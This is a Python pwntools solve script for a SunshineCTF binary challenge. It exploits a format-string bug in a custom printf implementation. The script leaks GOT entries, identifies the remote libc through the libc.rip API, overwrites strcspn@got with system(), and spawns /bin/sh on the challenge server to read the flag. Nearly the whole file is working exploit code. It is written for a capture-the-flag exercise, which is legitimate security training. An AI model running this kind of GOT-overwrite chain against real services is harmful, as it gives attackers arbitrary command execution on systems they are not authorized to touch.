#!/usr/bin/env python3
# SunshineCTF - "Print Print Revolution"
# Custom printf reimplementation => format string bug.
#   %N$s -> arbitrary read      %N$w -> arbitrary write (*arg[N] = arg[N+1])
#   Your buffer starts at vararg index 6  => buffer offset (N-6)*8 for arg N.
#   No PIE (GOT fixed), Partial RELRO (GOT writable).
#
# Chain: leak read@got -> libc base -> overwrite strcspn@got with system()
#        -> next input line becomes system("/bin/sh") via main's strcspn call.
#
# Usage:
#   python3 solve_revolution.py            # remote (auto-fingerprints libc via libc.rip)
#   python3 solve_revolution.py local      # test locally with ./revolution + system libc

import sys
from pwn import *

context.binary = exe = ELF('./revolution', checksec=False)
context.log_level = 'info'

HOST, PORT = 'chal.sunshinectf.games', 26002
READ_GOT    = 0x404018
WRITE_GOT   = 0x404000
STRCSPN_GOT = 0x404010

LOCAL = len(sys.argv) > 1 and sys.argv[1] == 'local'

# ---- format-string helpers (buffer = arg6, so arg N lives at offset (N-6)*8) ----
def leak(io, addr):
    # %8$s : format in first 16 bytes, target addr placed at offset 16 -> arg8
    io.sendline(b'%8$s'.ljust(16, b'P') + p64(addr))
    out = io.recvuntil(b'score> ')
    return u64(out[:6].ljust(8, b'\x00'))

def write(io, addr, value):
    # %8$w : ptr = arg8 (offset16), value = arg9 (offset24)
    io.sendline(b'%8$w'.ljust(16, b'P') + p64(addr) + p64(value))
    io.recvuntil(b'score> ')

# ---- identify remote libc from two leaks using libc.rip ----
def resolve_libc(read_addr, write_addr):
    import json, urllib.request
    body = json.dumps({'symbols': {
        'read':  hex(read_addr & 0xfff),
        'write': hex(write_addr & 0xfff),
    }}).encode()
    req = urllib.request.Request('https://libc.rip/api/find', data=body,
                                 headers={'Content-Type': 'application/json'})
    matches = json.load(urllib.request.urlopen(req, timeout=15))
    if not matches:
        log.failure('libc.rip found no match; download the remote libc manually.')
        sys.exit(1)
    m = matches[0]
    log.success('remote libc: %s' % m['id'])
    url = m['download_url']
    fn = 'remote_libc.so'
    open(fn, 'wb').write(urllib.request.urlopen(url, timeout=30).read())
    return ELF(fn, checksec=False)

def main():
    if LOCAL:
        io = process('./revolution')
    else:
        io = remote(HOST, PORT)
    io.recvuntil(b'score> ')

    read_addr = leak(io, READ_GOT)
    log.success('read@libc  = %#x' % read_addr)

    if LOCAL:
        libc = exe.libc
    else:
        write_addr = leak(io, WRITE_GOT)
        log.success('write@libc = %#x' % write_addr)
        libc = resolve_libc(read_addr, write_addr)

    libc.address = read_addr - libc.sym['read']
    log.success('libc base  = %#x' % libc.address)
    log.success('system     = %#x' % libc.sym['system'])

    # overwrite strcspn@got -> system
    write(io, STRCSPN_GOT, libc.sym['system'])

    # main now calls strcspn(buf, ...) == system(buf); buf must start with /bin/sh
    io.sendline(b'/bin/sh\x00')
    io.sendline(b'cat flag* /flag* 2>/dev/null; ls')
    io.interactive()

if __name__ == '__main__':
    main()
